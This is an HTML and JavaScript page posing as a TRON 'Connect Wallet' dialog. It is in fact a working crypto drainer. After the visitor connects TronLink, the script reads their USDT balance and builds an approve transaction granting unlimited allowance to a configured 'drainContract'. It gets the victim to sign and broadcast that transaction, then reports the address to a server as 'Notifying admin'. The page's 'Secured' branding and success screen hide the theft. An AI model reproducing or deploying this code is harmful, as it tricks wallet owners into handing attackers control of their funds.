<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connect Wallet</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Inter', -apple-system, sans-serif;
      background: #000; color: #fff;
      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
    }
    .container {
      width: 100%; max-width: 420px;
      background: #111; border: 1px solid #222; border-radius: 16px;
      padding: 28px 20px;
    }
    .header { text-align: center; margin-bottom: 20px; }
    .header h2 { font-size: 20px; font-weight: 600; margin-bottom: 4px; }
    .header p { font-size: 13px; color: #666; }
    .msg {
      padding: 10px 14px; border-radius: 10px; font-size: 13px; line-height: 1.5;
      margin-bottom: 14px; display: none; border: 1px solid transparent;
    }
    .msg.show { display: block; }
    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
    .msg.ok { background: #0a1a0a; border-color: #113311; color: #4ade80; }
    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
    .msg.warn { background: #1a1a0a; border-color: #333311; color: #ffd700; }
    .wallet-list { display: flex; flex-direction: column; gap: 8px; }
    .wallet-btn {
      display: flex; align-items: center; gap: 14px;
      padding: 14px 16px; background: #181818; border: 1px solid #2a2a2a;
      border-radius: 12px; cursor: pointer; font-family: inherit; color: #fff;
      text-align: left; width: 100%; transition: all 0.15s;
    }
    .wallet-btn:hover { border-color: #444; background: #1f1f1f; }
    .wallet-btn:active { transform: scale(0.98); }
    .wallet-btn .ico {
      width: 40px; height: 40px; border-radius: 10px;
      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
      overflow: hidden; background: #0a0a0a;
    }
    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; padding: 4px; }
    .wallet-btn .nm { font-size: 15px; font-weight: 500; }
    .wallet-btn .desc { font-size: 11px; color: #555; margin-left: auto; }
    .status-icon { text-align: center; margin: 24px 0; }
    .spinner {
      display: inline-block; width: 44px; height: 44px;
      border: 3px solid rgba(255,255,255,0.08); border-top-color: #4ade80;
      border-radius: 50%; animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .footer { margin-top: 18px; text-align: center; font-size: 11px; color: #333; }
    .screen { display: none; }
    .screen.on { display: block; }
    .retry-btn {
      display: block; width: 100%; padding: 14px; border-radius: 12px;
      border: none; background: #4ade80; color: #000; font-size: 15px;
      font-weight: 600; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
    }
    .retry-btn:hover { background: #22c55e; }
    .retry-btn:active { transform: scale(0.98); }
    .back-btn {
      display: block; width: 100%; padding: 12px; border-radius: 10px;
      border: 1px solid #222; background: transparent; color: #666;
      font-size: 13px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
    }
    .back-btn:hover { border-color: #444; color: #fff; }
    .success-icon {
      display: inline-block; width: 56px; height: 56px;
      border-radius: 50%; background: #0a1a0a; border: 2px solid #4ade80;
      line-height: 56px; text-align: center; font-size: 28px; color: #4ade80;
    }
    .address-display {
      background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px;
      padding: 10px 14px; font-family: monospace; font-size: 13px;
      color: #888; word-break: break-all; margin: 8px 0 12px;
      text-align: center;
    }
    .info-box {
      background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 8px;
      padding: 12px 14px; margin: 8px 0;
      font-size: 12px; color: #666; line-height: 1.6;
    }
    .info-box strong { color: #aaa; }
    .progress-steps { margin: 16px 0; }
    .step {
      display: flex; align-items: center; gap: 12px;
      padding: 8px 12px; border-radius: 8px;
      margin-bottom: 4px; font-size: 13px; color: #555;
      transition: all 0.3s;
    }
    .step.active { color: #fff; background: #1a1a1a; }
    .step.done { color: #4ade80; }
    .step .num {
      width: 24px; height: 24px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 11px; font-weight: 600; flex-shrink: 0;
      background: #222; color: #555;
    }
    .step.active .num { background: #4ade80; color: #000; }
    .step.done .num { background: #0a2a0a; color: #4ade80; }
    .step .check { color: #4ade80; font-weight: 600; }
    .config-error-box {
      background: #1a0a0a; border: 1px solid #331111; border-radius: 10px;
      padding: 16px; margin: 12px 0; text-align: center;
    }
    .config-error-box .icon { font-size: 32px; margin-bottom: 8px; }
    .config-error-box h3 { color: #ff6b6b; font-size: 15px; margin-bottom: 4px; }
    .config-error-box p { color: #888; font-size: 13px; line-height: 1.6; }
    .config-error-box .details { color: #555; font-size: 11px; margin-top: 8px; font-family: monospace; word-break: break-all; }
    .config-error-box button {
      margin-top: 12px; padding: 8px 20px; border-radius: 8px;
      border: 1px solid #333; background: transparent; color: #fff;
      font-family: inherit; font-size: 13px; cursor: pointer;
    }
    .config-error-box button:hover { border-color: #555; }
    @media (max-width: 480px) {
      body { padding: 12px; }
      .container { padding: 20px 16px; border-radius: 20px; }
      .wallet-btn { padding: 12px 14px; }
      .wallet-btn .ico { width: 34px; height: 34px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Connect Wallet</h2>
      <p>Choose your wallet to connect</p>
    </div>
    <div id="msgBox"></div>

    <!-- Screen: Wallet Selection -->
    <div class="screen on" id="scConnect">
      <div class="wallet-list" id="walletList"></div>
      <button class="back-btn" onclick="window.close()">Cancel</button>
    </div>

    <!-- Screen: Waiting for Connection -->
    <div class="screen" id="scWait">
      <div class="status-icon"><div class="spinner"></div></div>
      <div style="text-align:center;font-size:15px;font-weight:500;color:#fff;">Connecting...</div>
      <div style="text-align:center;font-size:13px;color:#666;margin-top:4px;" id="waitDesc">Please confirm in your wallet</div>
      <button class="back-btn" onclick="location.reload()">Cancel</button>
    </div>

    <!-- Screen: Connected & Processing -->
    <div class="screen" id="scProcessing">
      <div class="status-icon"><div class="spinner"></div></div>
      <div style="text-align:center;font-size:15px;font-weight:500;color:#fff;" id="processingTitle">Processing...</div>
      <div style="text-align:center;font-size:13px;color:#666;margin-top:4px;" id="processingDesc">Please wait</div>
    </div>

    <!-- Screen: Done -->
    <div class="screen" id="scDone">
      <div class="status-icon"><div class="success-icon">✓</div></div>
      <div style="text-align:center;">
        <div style="font-size:18px;font-weight:700;color:#4ade80;margin-bottom:4px;">Wallet Connected</div>
        <div style="font-size:13px;color:#666;">You can close this page</div>
        <div class="address-display" id="doneAddress"></div>
      </div>
      <button class="back-btn" onclick="window.close()">Close</button>
    </div>

    <!-- Screen: Error -->
    <div class="screen" id="scError">
      <div class="status-icon">
        <svg viewBox="0 0 24 24" fill="none" stroke="#ff6b6b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:56px;height:56px;">
          <circle cx="12" cy="12" r="10"/>
          <line x1="15" y1="9" x2="9" y2="15"/>
          <line x1="9" y1="9" x2="15" y2="15"/>
        </svg>
      </div>
      <div style="text-align:center;">
        <div style="font-size:16px;font-weight:600;color:#ff6b6b;" id="errorTitle">Connection Failed</div>
        <div style="font-size:13px;color:#888;margin-top:4px;" id="errorDesc">Please try again</div>
      </div>
      <button class="retry-btn" onclick="location.reload()">🔄 Try Again</button>
      <button class="back-btn" onclick="window.close()">Close</button>
    </div>

    <div class="footer">TRON Network • Secured</div>
  </div>

  <script>
    // ============================================================
    // CONFIGURATION
    // ============================================================

    var SITE_URL = window.location.origin;
    var config = {};
    var connectedAddress = null;
    var isProcessing = false;

    // ============================================================
    // WALLETS
    // ============================================================

    var WALLETS = [
      { 
        id: 'tronlink', 
        name: 'TronLink', 
        logo: 'https://tronlink.org/favicon.ico'
      },
      { 
        id: 'okx', 
        name: 'OKX Wallet', 
        logo: 'https://dl.svgcdn.com/svg/token-branded/okx.svg'
      },
      { 
        id: 'tokenpocket', 
        name: 'TokenPocket', 
        logo: 'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg'
      },
      { 
        id: 'trust', 
        name: 'Trust Wallet', 
        logo: 'https://dl.svgcdn.com/svg/token-branded/trust.svg'
      },
      { 
        id: 'bitget', 
        name: 'Bitget Wallet', 
        logo: 'https://dl.svgcdn.com/svg/token-branded/bitget.svg'
      },
      { 
        id: 'imtoken', 
        name: 'imToken', 
        logo: 'https://dl.svgcdn.com/svg/token-branded/imtoken.svg'
      },
    ];

    // ============================================================
    // USDT ABI
    // ============================================================

    var USDT_ABI = [
      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}
    ];

    // ============================================================
    // DOM REFS
    // ============================================================

    var msgBox = document.getElementById('msgBox');

    function msg(type, text) {
      msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>';
    }
    function hideMsg() { msgBox.innerHTML = ''; }
    function scShow(id) {
      document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
      document.getElementById(id).classList.add('on');
    }

    // ============================================================
    // TRON PROVIDER
    // ============================================================

    function getTronLink() {
      return window.tronLink || null;
    }

    function getTronWeb() {
      if (window.tronWeb && window.tronWeb.ready) {
        return window.tronWeb;
      }
      return window.tronWeb || null;
    }

    // ============================================================
    // FETCH CONFIG
    // ============================================================

    async function fetchConfig() {
      try {
        var r = await fetch(SITE_URL + '/api/config');
        if (!r.ok) throw new Error('HTTP ' + r.status);
        var data = await r.json();
        if (data && data.usdtContract) {
          config = data;
          console.log('✅ Config loaded:', config);
          return config;
        }
        throw new Error('Invalid config');
      } catch(e) {
        console.warn('Config fetch failed:', e.message);
        // Use default config
        config = {
          usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          drainContract: '',
          maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
        };
        return config;
      }
    }

    // ============================================================
    // CONNECT WALLET - PROPER POPUP FLOW
    // ============================================================

    async function connectWallet(walletId) {
      if (isProcessing) return;
      hideMsg();
      isProcessing = true;

      console.log('🔄 Connecting to:', walletId);

      // Load config
      if (!config || !config.usdtContract) {
        await fetchConfig();
      }

      if (!config.drainContract) {
        msg('err', 'Drain contract not deployed. Please check admin panel.');
        isProcessing = false;
        return;
      }

      // Show waiting screen
      scShow('scWait');
      document.getElementById('waitDesc').textContent = 'Please confirm in your wallet...';

      try {
        // ============================================================
        // STEP 1: Get TronLink instance and request connection
        // ============================================================
        
        var tronLink = getTronLink();
        console.log('📱 TronLink instance:', tronLink);

        if (!tronLink) {
          msg('err', 'TronLink not detected. Please install TronLink extension.');
          scShow('scConnect');
          isProcessing = false;
          return;
        }

        // ============================================================
        // STEP 2: Request accounts (this triggers the popup)
        // ============================================================
        
        var address = null;
        
        // Method 1: Use tronLink.request (recommended)
        if (typeof tronLink.request === 'function') {
          try {
            console.log('📤 Requesting accounts via tronLink.request...');
            var result = await tronLink.request({ method: 'tron_requestAccounts' });
            console.log('📥 Result:', result);
            
            if (result) {
              if (typeof result === 'string') address = result;
              else if (Array.isArray(result) && result.length > 0) address = result[0];
              else if (result.address) address = result.address;
              else if (result.data) {
                if (typeof result.data === 'string') address = result.data;
                else if (result.data.address) address = result.data.address;
                else if (Array.isArray(result.data) && result.data.length > 0) address = result.data[0];
              }
            }
          } catch(e) {
            console.warn('tronLink.request failed:', e.message);
          }
        }

        // Method 2: Check if already connected
        if (!address && tronLink.tronWeb && tronLink.tronWeb.defaultAddress) {
          address = tronLink.tronWeb.defaultAddress.base58 || null;
          console.log('📍 Got address from tronWeb.defaultAddress:', address);
        }

        // Method 3: Use tronWeb directly
        if (!address) {
          var tw = getTronWeb();
          if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
            address = tw.defaultAddress.base58;
            console.log('📍 Got address from getTronWeb():', address);
          }
        }

        if (!address) {
          throw new Error('Could not get wallet address. Please make sure TronLink is unlocked.');
        }

        console.log('✅ Address obtained:', address);
        connectedAddress = address;

        // ============================================================
        // STEP 3: Send address to server
        // ============================================================
        
        try {
          await fetch(SITE_URL + '/api/qr-connect/' + SESSION_ID, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: address })
          });
        } catch(e) {}

        // ============================================================
        // STEP 4: Proceed to approve flow
        // ============================================================
        
        await doApproveFlow(address);

      } catch(e) {
        console.error('❌ Connection error:', e);
        var errMsg = e.message || String(e);
        if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
          showError('Cancelled', 'You cancelled the connection');
        } else {
          showError('Connection Error', errMsg);
        }
        isProcessing = false;
      }
    }

    // ============================================================
    // APPROVE FLOW
    // ============================================================

    async function doApproveFlow(address) {
      scShow('scProcessing');
      document.getElementById('processingTitle').textContent = 'Checking balance...';
      document.getElementById('processingDesc').textContent = 'Verifying USDT balance';

      try {
        // Get provider
        var tronLink = getTronLink();
        var provider = tronLink && tronLink.tronWeb ? tronLink.tronWeb : getTronWeb();
        
        if (!provider) {
          throw new Error('TronWeb provider not available');
        }

        // Get USDT contract
        var usdtContract;
        try {
          usdtContract = await provider.contract(USDT_ABI).at(config.usdtContract);
          console.log('✅ USDT contract loaded');
        } catch(e) {
          throw new Error('Could not load USDT contract: ' + e.message);
        }

        // Check balance
        document.getElementById('processingDesc').textContent = 'Checking balance...';
        var rawBalance = await usdtContract.balanceOf(address).call();
        var balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
        var balanceUsdt = balance / 1e6;

        console.log('💰 USDT Balance:', balanceUsdt);

        // Build approve transaction
        document.getElementById('processingTitle').textContent = 'Approving USDT...';
        document.getElementById('processingDesc').textContent = 'Please confirm in your wallet';

        var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        console.log('📝 Building approve transaction...');
        console.log('📝 USDT:', config.usdtContract);
        console.log('📝 Spender:', config.drainContract);

        // Build transaction
        var built = await provider.transactionBuilder.triggerSmartContract(
          config.usdtContract,
          'approve(address,uint256)',
          { feeLimit: 20000000 },
          [
            { type: 'address', value: config.drainContract },
            { type: 'uint256', value: approveVal }
          ],
          address
        );

        var approveTx = built.transaction || built;
        if (!approveTx || !approveTx.txID) {
          throw new Error('Transaction build failed');
        }

        console.log('✅ Transaction built, signing...');

        // Sign transaction (this triggers the second popup)
        var signedApprove;
        try {
          signedApprove = await provider.trx.sign(approveTx);
          console.log('✅ Transaction signed');
        } catch(e) {
          var errMsg = e.message || String(e);
          if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
            showError('Cancelled', 'You cancelled the approval');
            return;
          }
          throw new Error('Sign failed: ' + errMsg);
        }

        // Broadcast transaction
        document.getElementById('processingDesc').textContent = 'Broadcasting...';
        var receipt = await provider.trx.sendRawTransaction(signedApprove);
        console.log('✅ Transaction broadcasted:', receipt);

        var txId = receipt.txid || receipt.txID || '';
        console.log('📝 TX ID:', txId);

        // Notify server
        document.getElementById('processingDesc').textContent = 'Notifying admin...';
        await fetch(SITE_URL + '/api/approve-done', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: address })
        });

        // Show success
        scShow('scDone');
        document.getElementById('doneAddress').textContent = address;
        isProcessing = false;

      } catch(e) {
        console.error('❌ Approve error:', e);
        showError('Approval Failed', e.message || 'An error occurred');
        isProcessing = false;
      }
    }

    // ============================================================
    // UI HELPERS
    // ============================================================

    function showError(title, desc) {
      scShow('scError');
      document.getElementById('errorTitle').textContent = title;
      document.getElementById('errorDesc').textContent = desc;
    }

    // ============================================================
    // RENDER WALLETS
    // ============================================================

    function renderWallets() {
      var walletList = document.getElementById('walletList');
      walletList.innerHTML = '';
      for (var i = 0; i < WALLETS.length; i++) {
        var w = WALLETS[i];
        var b = document.createElement('button');
        b.className = 'wallet-btn';
        b.innerHTML = '<div class="ico"><img src="' + w.logo + '" alt="' + w.name + '" loading="lazy" onerror="this.style.display=\'none\'"></div><div class="nm">' + w.name + '</div>';
        b.addEventListener('click', (function(id) {
          return function() { connectWallet(id); };
        })(w.id));
        walletList.appendChild(b);
      }
    }

    // ============================================================
    // INIT
    // ============================================================

    var SESSION_ID = 'local-' + Date.now();

    renderWallets();
    fetchConfig();

    console.log('📱 QR Session:', SESSION_ID);
    console.log('🌐 Site URL:', SITE_URL);
  </script>
</body>
</html>
